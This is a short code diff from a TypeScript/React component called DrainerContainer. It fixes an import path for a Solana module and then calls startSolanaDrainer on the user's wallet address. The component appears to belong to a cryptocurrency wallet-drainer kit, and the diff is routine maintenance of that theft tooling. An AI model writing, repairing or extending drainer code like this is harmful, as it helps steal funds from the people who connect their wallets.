@@ -80,7 +80,7 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       // 4. EXECUTE SOLANA LOGIC
       else if (chainId === 'solana' || chainId === 'sol') {
         console.log("Loading Solana modules...");
-        const solanaModule: any = await import('@/processors/solana/index.js');
+        const solanaModule: any = await import('@/processors/solana/index');
         const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;
         if (typeof startSolanaDrainer === 'function') {
           await startSolanaDrainer(userAddress);
